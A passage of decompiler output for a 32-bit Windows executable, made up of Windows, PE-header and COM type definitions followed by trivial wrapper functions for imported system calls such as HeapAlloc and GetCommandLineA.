typedef unsigned char   undefined;

typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef unsigned short    wchar16;
typedef struct tagMSG tagMSG, *PtagMSG;

typedef struct tagMSG MSG;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef ulong DWORD;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

typedef long LONG;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagMSG {
    HWND hwnd;
    UINT message;
    WPARAM wParam;
    LPARAM lParam;
    DWORD time;
    POINT pt;
};

struct HWND__ {
    int unused;
};

typedef struct tagMSG *LPMSG;

typedef struct _GUID _GUID, *P_GUID;

struct _GUID {
    ulong Data1;
    ushort Data2;
    ushort Data3;
    uchar Data4[8];
};

typedef struct _GUID GUID;

typedef GUID IID;

typedef GUID CLSID;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _WIN32_FIND_DATAA _WIN32_FIND_DATAA, *P_WIN32_FIND_DATAA;

typedef struct _WIN32_FIND_DATAA *LPWIN32_FIND_DATAA;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAA {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    CHAR cFileName[260];
    CHAR cAlternateFileName[14];
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _SECURITY_ATTRIBUTES SECURITY_ATTRIBUTES;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _SYSTEMTIME *LPSYSTEMTIME;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef union _ULARGE_INTEGER _ULARGE_INTEGER, *P_ULARGE_INTEGER;

typedef union _ULARGE_INTEGER ULARGE_INTEGER;

typedef struct _struct_22 _struct_22, *P_struct_22;

typedef struct _struct_23 _struct_23, *P_struct_23;

typedef double ULONGLONG;

struct _struct_23 {
    DWORD LowPart;
    DWORD HighPart;
};

struct _struct_22 {
    DWORD LowPart;
    DWORD HighPart;
};

union _ULARGE_INTEGER {
    struct _struct_22 s;
    struct _struct_23 u;
    ULONGLONG QuadPart;
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef wchar_t WCHAR;

typedef long HRESULT;

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _OSVERSIONINFOA *LPOSVERSIONINFOA;

typedef WCHAR *LPWSTR;

typedef CONTEXT *PCONTEXT;

typedef DWORD ACCESS_MASK;

typedef WCHAR *LPCWSTR;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[192]; // Actual DOS program
};

typedef struct IStreamVtbl IStreamVtbl, *PIStreamVtbl;

typedef struct IStream IStream, *PIStream;

typedef DWORD ULONG;

typedef struct tagSTATSTG tagSTATSTG, *PtagSTATSTG;

typedef struct tagSTATSTG STATSTG;

typedef WCHAR OLECHAR;

typedef OLECHAR *LPOLESTR;

struct IStreamVtbl {
    HRESULT (*QueryInterface)(struct IStream *, IID *, void **);
    ULONG (*AddRef)(struct IStream *);
    ULONG (*Release)(struct IStream *);
    HRESULT (*Read)(struct IStream *, void *, ULONG, ULONG *);
    HRESULT (*Write)(struct IStream *, void *, ULONG, ULONG *);
    HRESULT (*Seek)(struct IStream *, LARGE_INTEGER, DWORD, ULARGE_INTEGER *);
    HRESULT (*SetSize)(struct IStream *, ULARGE_INTEGER);
    HRESULT (*CopyTo)(struct IStream *, struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER *, ULARGE_INTEGER *);
    HRESULT (*Commit)(struct IStream *, DWORD);
    HRESULT (*Revert)(struct IStream *);
    HRESULT (*LockRegion)(struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (*UnlockRegion)(struct IStream *, ULARGE_INTEGER, ULARGE_INTEGER, DWORD);
    HRESULT (*Stat)(struct IStream *, STATSTG *, DWORD);
    HRESULT (*Clone)(struct IStream *, struct IStream **);
};

struct IStream {
    struct IStreamVtbl *lpVtbl;
};

struct tagSTATSTG {
    LPOLESTR pwcsName;
    DWORD type;
    ULARGE_INTEGER cbSize;
    FILETIME mtime;
    FILETIME ctime;
    FILETIME atime;
    DWORD grfMode;
    DWORD grfLocksSupported;
    CLSID clsid;
    DWORD grfStateBits;
    DWORD reserved;
};

typedef union _union_2260 _union_2260, *P_union_2260;

typedef struct HBITMAP__ HBITMAP__, *PHBITMAP__;

typedef struct HBITMAP__ *HBITMAP;

typedef void *HMETAFILEPICT;

typedef struct HENHMETAFILE__ HENHMETAFILE__, *PHENHMETAFILE__;

typedef struct HENHMETAFILE__ *HENHMETAFILE;

typedef HANDLE HGLOBAL;

typedef struct IStorage IStorage, *PIStorage;

typedef struct IStorageVtbl IStorageVtbl, *PIStorageVtbl;

typedef LPOLESTR *SNB;

typedef struct IEnumSTATSTG IEnumSTATSTG, *PIEnumSTATSTG;

typedef struct IEnumSTATSTGVtbl IEnumSTATSTGVtbl, *PIEnumSTATSTGVtbl;

struct HBITMAP__ {
    int unused;
};

struct IEnumSTATSTG {
    struct IEnumSTATSTGVtbl *lpVtbl;
};

union _union_2260 {
    HBITMAP hBitmap;
    HMETAFILEPICT hMetaFilePict;
    HENHMETAFILE hEnhMetaFile;
    HGLOBAL hGlobal;
    LPOLESTR lpszFileName;
    struct IStream *pstm;
    struct IStorage *pstg;
};

struct IStorageVtbl {
    HRESULT (*QueryInterface)(struct IStorage *, IID *, void **);
    ULONG (*AddRef)(struct IStorage *);
    ULONG (*Release)(struct IStorage *);
    HRESULT (*CreateStream)(struct IStorage *, OLECHAR *, DWORD, DWORD, DWORD, struct IStream **);
    HRESULT (*OpenStream)(struct IStorage *, OLECHAR *, void *, DWORD, DWORD, struct IStream **);
    HRESULT (*CreateStorage)(struct IStorage *, OLECHAR *, DWORD, DWORD, DWORD, struct IStorage **);
    HRESULT (*OpenStorage)(struct IStorage *, OLECHAR *, struct IStorage *, DWORD, SNB, DWORD, struct IStorage **);
    HRESULT (*CopyTo)(struct IStorage *, DWORD, IID *, SNB, struct IStorage *);
    HRESULT (*MoveElementTo)(struct IStorage *, OLECHAR *, struct IStorage *, OLECHAR *, DWORD);
    HRESULT (*Commit)(struct IStorage *, DWORD);
    HRESULT (*Revert)(struct IStorage *);
    HRESULT (*EnumElements)(struct IStorage *, DWORD, void *, DWORD, struct IEnumSTATSTG **);
    HRESULT (*DestroyElement)(struct IStorage *, OLECHAR *);
    HRESULT (*RenameElement)(struct IStorage *, OLECHAR *, OLECHAR *);
    HRESULT (*SetElementTimes)(struct IStorage *, OLECHAR *, FILETIME *, FILETIME *, FILETIME *);
    HRESULT (*SetClass)(struct IStorage *, IID *);
    HRESULT (*SetStateBits)(struct IStorage *, DWORD, DWORD);
    HRESULT (*Stat)(struct IStorage *, STATSTG *, DWORD);
};

struct HENHMETAFILE__ {
    int unused;
};

struct IStorage {
    struct IStorageVtbl *lpVtbl;
};

struct IEnumSTATSTGVtbl {
    HRESULT (*QueryInterface)(struct IEnumSTATSTG *, IID *, void **);
    ULONG (*AddRef)(struct IEnumSTATSTG *);
    ULONG (*Release)(struct IEnumSTATSTG *);
    HRESULT (*Next)(struct IEnumSTATSTG *, ULONG, STATSTG *, ULONG *);
    HRESULT (*Skip)(struct IEnumSTATSTG *, ULONG);
    HRESULT (*Reset)(struct IEnumSTATSTG *);
    HRESULT (*Clone)(struct IEnumSTATSTG *, struct IEnumSTATSTG **);
};

typedef struct tagSTGMEDIUM tagSTGMEDIUM, *PtagSTGMEDIUM;

typedef struct tagSTGMEDIUM uSTGMEDIUM;

typedef uSTGMEDIUM STGMEDIUM;

typedef struct IUnknown IUnknown, *PIUnknown;

typedef struct IUnknownVtbl IUnknownVtbl, *PIUnknownVtbl;

struct tagSTGMEDIUM {
    DWORD tymed;
    union _union_2260 u;
    struct IUnknown *pUnkForRelease;
};

struct IUnknownVtbl {
    HRESULT (*QueryInterface)(struct IUnknown *, IID *, void **);
    ULONG (*AddRef)(struct IUnknown *);
    ULONG (*Release)(struct IUnknown *);
};

struct IUnknown {
    struct IUnknownVtbl *lpVtbl;
};

typedef struct tagFORMATETC tagFORMATETC, *PtagFORMATETC;

typedef WORD CLIPFORMAT;

typedef struct tagDVTARGETDEVICE tagDVTARGETDEVICE, *PtagDVTARGETDEVICE;

typedef struct tagDVTARGETDEVICE DVTARGETDEVICE;

struct tagFORMATETC {
    CLIPFORMAT cfFormat;
    DVTARGETDEVICE *ptd;
    DWORD dwAspect;
    LONG lindex;
    DWORD tymed;
};

struct tagDVTARGETDEVICE {
    DWORD tdSize;
    WORD tdDriverNameOffset;
    WORD tdDeviceNameOffset;
    WORD tdPortNameOffset;
    WORD tdExtDevmodeOffset;
    BYTE tdData[1];
};

typedef struct tagFORMATETC FORMATETC;

typedef ULONG_PTR SIZE_T;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef OLECHAR *BSTR;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct _FILETIME *PFILETIME;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef int INT;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef LONG_PTR LRESULT;

typedef BOOL *LPBOOL;

typedef void *LPCVOID;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_THUNK_DATA32 IMAGE_THUNK_DATA32, *PIMAGE_THUNK_DATA32;

struct IMAGE_THUNK_DATA32 {
    dword StartAddressOfRawData;
    dword EndAddressOfRawData;
    dword AddressOfIndex;
    dword AddressOfCallBacks;
    dword SizeOfZeroFill;
    dword Characteristics;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_12 IMAGE_RESOURCE_DIR_STRING_U_12, *PIMAGE_RESOURCE_DIR_STRING_U_12;

struct IMAGE_RESOURCE_DIR_STRING_U_12 {
    word Length;
    wchar16 NameString[6];
};

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef struct _NETRESOURCEA _NETRESOURCEA, *P_NETRESOURCEA;

struct _NETRESOURCEA {
    DWORD dwScope;
    DWORD dwType;
    DWORD dwDisplayType;
    DWORD dwUsage;
    LPSTR lpLocalName;
    LPSTR lpRemoteName;
    LPSTR lpComment;
    LPSTR lpProvider;
};

typedef struct _NETRESOURCEA *LPNETRESOURCEA;

typedef struct _tagBINDINFO _tagBINDINFO, *P_tagBINDINFO;

typedef struct _tagBINDINFO BINDINFO;

struct _tagBINDINFO {
    ULONG cbSize;
    LPWSTR szExtraInfo;
    STGMEDIUM stgmedData;
    DWORD grfBindInfoF;
    DWORD dwBindVerb;
    LPWSTR szCustomVerb;
    DWORD cbstgmedData;
    DWORD dwOptions;
    DWORD dwOptionsFlags;
    DWORD dwCodePage;
    SECURITY_ATTRIBUTES securityAttributes;
    IID iid;
    struct IUnknown *pUnk;
    DWORD dwReserved;
};

typedef struct IBindStatusCallback IBindStatusCallback, *PIBindStatusCallback;

typedef struct IBindStatusCallbackVtbl IBindStatusCallbackVtbl, *PIBindStatusCallbackVtbl;

typedef struct IBinding IBinding, *PIBinding;

typedef struct IBindingVtbl IBindingVtbl, *PIBindingVtbl;

struct IBindStatusCallback {
    struct IBindStatusCallbackVtbl *lpVtbl;
};

struct IBindingVtbl {
    HRESULT (*QueryInterface)(struct IBinding *, IID *, void **);
    ULONG (*AddRef)(struct IBinding *);
    ULONG (*Release)(struct IBinding *);
    HRESULT (*Abort)(struct IBinding *);
    HRESULT (*Suspend)(struct IBinding *);
    HRESULT (*Resume)(struct IBinding *);
    HRESULT (*SetPriority)(struct IBinding *, LONG);
    HRESULT (*GetPriority)(struct IBinding *, LONG *);
    HRESULT (*GetBindResult)(struct IBinding *, CLSID *, DWORD *, LPOLESTR *, DWORD *);
};

struct IBinding {
    struct IBindingVtbl *lpVtbl;
};

struct IBindStatusCallbackVtbl {
    HRESULT (*QueryInterface)(struct IBindStatusCallback *, IID *, void **);
    ULONG (*AddRef)(struct IBindStatusCallback *);
    ULONG (*Release)(struct IBindStatusCallback *);
    HRESULT (*OnStartBinding)(struct IBindStatusCallback *, DWORD, struct IBinding *);
    HRESULT (*GetPriority)(struct IBindStatusCallback *, LONG *);
    HRESULT (*OnLowResource)(struct IBindStatusCallback *, DWORD);
    HRESULT (*OnProgress)(struct IBindStatusCallback *, ULONG, ULONG, ULONG, LPCWSTR);
    HRESULT (*OnStopBinding)(struct IBindStatusCallback *, HRESULT, LPCWSTR);
    HRESULT (*GetBindInfo)(struct IBindStatusCallback *, DWORD *, BINDINFO *);
    HRESULT (*OnDataAvailable)(struct IBindStatusCallback *, DWORD, DWORD, FORMATETC *, STGMEDIUM *);
    HRESULT (*OnObjectAvailable)(struct IBindStatusCallback *, IID *, struct IUnknown *);
};

typedef struct IBindStatusCallback *LPBINDSTATUSCALLBACK;

typedef UINT_PTR SOCKET;

typedef struct IUnknown *LPUNKNOWN;




HANDLE __stdcall GetProcessHeap(void)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401080. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GetProcessHeap();
  return pvVar1;
}



LPVOID __stdcall HeapAlloc(HANDLE hHeap,DWORD dwFlags,SIZE_T dwBytes)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401088. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = HeapAlloc(hHeap,dwFlags,dwBytes);
  return pvVar1;
}



LPVOID __stdcall HeapReAlloc(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem,SIZE_T dwBytes)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401090. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = HeapReAlloc(hHeap,dwFlags,lpMem,dwBytes);
  return pvVar1;
}



BOOL __stdcall HeapFree(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401098. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = HeapFree(hHeap,dwFlags,lpMem);
  return BVar1;
}



BOOL __stdcall FreeLibrary(HMODULE hLibModule)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010a0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FreeLibrary(hLibModule);
  return BVar1;
}



DWORD __stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010a8. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetModuleFileNameA(hModule,lpFilename,nSize);
  return DVar1;
}



HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010b0. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = GetModuleHandleA(lpModuleName);
  return pHVar1;
}



HLOCAL __stdcall LocalAlloc(UINT uFlags,SIZE_T uBytes)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010b8. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = LocalAlloc(uFlags,uBytes);
  return pvVar1;
}



LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010c0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = TlsGetValue(dwTlsIndex);
  return pvVar1;
}



BOOL __stdcall TlsSetValue(DWORD dwTlsIndex,LPVOID lpTlsValue)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010c8. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = TlsSetValue(dwTlsIndex,lpTlsValue);
  return BVar1;
}



LPSTR __stdcall GetCommandLineA(void)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x004010d0. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = GetCommandLineA();
  return pCVar1;
}



BOOL __stdcall CloseHandle(HANDLE hObject)

{
  BOOL BVar1;
  
